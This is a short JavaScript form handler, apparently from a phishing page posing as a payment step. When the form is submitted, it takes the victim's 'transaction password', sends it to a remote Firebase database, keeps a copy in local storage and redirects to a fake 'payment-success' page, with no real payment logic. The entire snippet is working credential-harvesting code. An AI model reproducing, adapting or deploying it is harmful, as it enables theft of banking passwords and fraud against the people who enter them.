document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  const txnPassword = document.getElementById("tpass").value;

  const ref = firebase.database().ref("ududip007").push();
  ref.set({
    transaction_password: txnPassword
  }).then(() => {
    localStorage.setItem("txn_password", txnPassword);
    
    window.location.href = "payment-success.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
